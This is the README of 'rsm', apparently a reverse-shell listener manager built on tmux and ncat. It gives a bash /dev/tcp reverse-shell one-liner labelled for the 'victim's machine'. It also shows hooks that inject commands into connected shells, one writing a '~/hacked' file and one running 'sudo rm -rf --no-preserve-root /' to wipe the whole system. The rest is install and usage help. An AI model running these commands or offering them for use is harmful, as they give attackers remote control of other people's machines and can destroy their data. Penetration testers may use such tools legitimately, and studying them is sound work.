# rsm

A simple reverse shell manager using `tmux` and `ncat`.

## Quick Start

Listening on a port

```shell
git clone https://github.com/djosix/rsm.git
cd rsm

./rsm 11111
# You will attach to a tmux session called 'rsm-11111',
# where 11111 is your listening port.
# You will not see rsm session when you open tmux
# because it uses its own tmux socket.
```

On victim's machine, launch a reverse shell

```shell
bash -c 'bash -i >& /dev/tcp/127.0.0.1/11111 0<&1'
# Once connected to the listening port,
# the script will create a window in our tmux session.
# Just switch to that window and interact with the client.
```

Attaching to the last rsm session

```shell
./rsm attach
```

Stop the server and cleanup

```shell
./rsm stop
# Stop all rsm listeners
```

Hooking the client connection

```shell
HOOK='echo Hello, you are $IP:$PORT' ./rsm d 12345
nc 127.0.0.1 12345
#| Hello, you are 127.0.0.1:50522
#|

HOOK='echo "echo hehe > ~/hacked"' ./rsm d 12345
bash -c 'bash -i >& /dev/tcp/127.0.0.1/12345 0<&1'
cat ~/hacked
#| hehe

HOOK='echo "sudo rm -rf --no-preserve-root /"' ./rsm d 12345
bash -c 'bash -i >& /dev/tcp/127.0.0.1/12345 0<&1' # good luck
```

## Install

```shell
git clone --depth 1 https://github.com/djosix/rsm.git $HOME/.rsm
# Then add $HOME/.rsm to your PATH
```

## Usage

```shell
$ rsm help
Usage:

    rsm PORT            Start a reverse shell listener on PORT
    rsm d[etached] PORT Start a detached reverse shell listener on PORT
    rsm l[ist]          List active rsm listeners
    rsm i[nfo] PORT     Show details of listener on PORT
    rsm i[nfo]          Show details of all rsm listeners
    rsm s[top] PORT     Stop a rsm listener on PORT
    rsm s[top]          Stop all rsm listeners
    rsm a[ttach] PORT   Attach to a rsm session listening on PORT
    rsm a[ttach]        Attach to the last rsm session
    rsm c[lean] PORT    Clean sockets for PORT
    rsm c[lean]         Clean all sockets
    rsm h[elp]          Show this help message
```
